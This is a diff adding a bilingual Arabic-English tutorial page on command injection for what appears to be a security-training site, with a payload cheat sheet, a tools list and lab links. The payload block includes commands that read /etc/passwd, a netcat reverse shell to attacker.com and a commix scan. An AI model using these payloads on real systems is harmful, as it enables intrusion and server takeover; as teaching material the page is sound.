@@ -1,0 +1,89 @@
+{% extends "main/academy/base.html" %}
+
+{% block title %}Command Injection — RCE via Input{% endblock %}
+{% block meta_desc %}Command Injection, Remote Code Execution (RCE), blind command injection, shell payloads, and commix in Arabic & English{% endblock %}
+
+{% block content %}
+<div class="page-hero">
+  <h1 class="page-title">حقن الأوامر — تنفيذ الأكواد عن بعد (RCE)</h1>
+  <p class="page-title-en">Command Injection — RCE via Input</p>
+  <span class="severity-pill pill-critical">CRITICAL</span>
+  <span class="severity-pill pill-high">OWASP A03</span>
+</div>
+
+<div class="bilingual-block">
+  <div class="lang-section">
+    <span class="lang-tag">AR</span>
+    <p><strong>Command Injection</strong> ثغرة بالغة الخطورة تحدث عندما يقوم التطبيق بتمرير مدخلات المستخدم مباشرة ليتم تنفيذها كأوامر في نظام التشغيل (OS System Shell) دون فحص أو عزل سليم. يتيح هذا للمهاجم تنفيذ أي أوامر يرغب فيها والسيطرة الكاملة على السيرفر (RCE).</p>
+  </div>
+  <div class="lang-section lang-en">
+    <span class="lang-tag">EN</span>
+    <p><strong>Command Injection</strong> is a critical vulnerability that occurs when an application passes unsafe user-supplied data to a system shell. The operating system executes this data as commands, allowing the attacker to achieve full Remote Code Execution (RCE).</p>
+  </div>
+</div>
+
+<div class="section-card">
+  <h2>أنواع حقن الأوامر / Vulnerability Types</h2>
+  <div class="type-grid">
+    <div class="type-item">
+      <h4>Classic Command Injection</h4>
+      <p>مخرجات نظام التشغيل تظهر مباشرة للمستخدم في استجابة صفحة الويب.</p>
+    </div>
+    <div class="type-item">
+      <h4>Blind Command Injection</h4>
+      <p>المخرجات لا تظهر في الاستجابة. يتطلب الكشف عنها إحداث تأخير زمني (Time Delay) مثل <code>sleep 5</code>.</p>
+    </div>
+    <div class="type-item">
+      <h4>Out-of-Band (OOB) Injection</h4>
+      <p>إجبار السيرفر على إرسال المخرجات لخادم خارجي يتحكم فيه المهاجم عبر بروتوكولات مثل DNS أو HTTP.</p>
+    </div>
+  </div>
+</div>
+
+<div class="section-card">
+  <h2>أوامر الاختبار والـ Payloads الحية / Commmand Injection Payloads</h2>
+  <div class="cmd-block">
+    <pre># Classic command separation payloads
+; whoami
+| id
+& cat /etc/passwd
+`uname -a`
+$(id)
+
+# Blind time-delay testing
+; sleep 10
+
+# Reverse shell payload
+; nc -e /bin/sh attacker.com 4444
+
+# Automated testing with Commix
+commix -u "https://target.com/index.php?addr=127.0.0.1" --batch</pre>
+    <div class="cmd-footer"><button class="copy-btn" onclick="copyCmd(this)">📋 Copy</button></div>
+  </div>
+</div>
+
+<div class="section-card">
+  <h2>الأدوات / Tools</h2>
+  <div class="tools-row">
+    <span class="tool-chip">commix</span>
+    <span class="tool-chip">Burp Suite Repeater</span>
+    <span class="tool-chip">payloadsallthethings</span>
+    <span class="tool-chip">nc (Netcat)</span>
+  </div>
+</div>
+
+<div class="section-card">
+  <h2>Writeup & Lab</h2>
+  <div class="bilingual-block">
+    <div class="lang-section">
+      <span class="lang-tag">AR</span>
+      <p>Writeup: <strong>Command Injection: From Input to Shell</strong> — تقرير يوضح استغلال حقل فحص الشبكة (Ping utility) لتشغيل reverse shell والتحكم التام بالسيرفر الداخلي.</p>
+    </div>
+    <div class="lang-section lang-en">
+      <span class="lang-tag">EN</span>
+      <p>Writeup: <strong>Command Injection: From Input to Shell</strong> — how a simple ping utility parameter was exploited to gain a reverse shell connection.</p>
+    </div>
+  </div>
+  <a class="cta-lab" href="labs/command-injection-lab.html">🧪 افتح Command Injection Lab — 3 Levels</a>
+</div>
+{% endblock %}
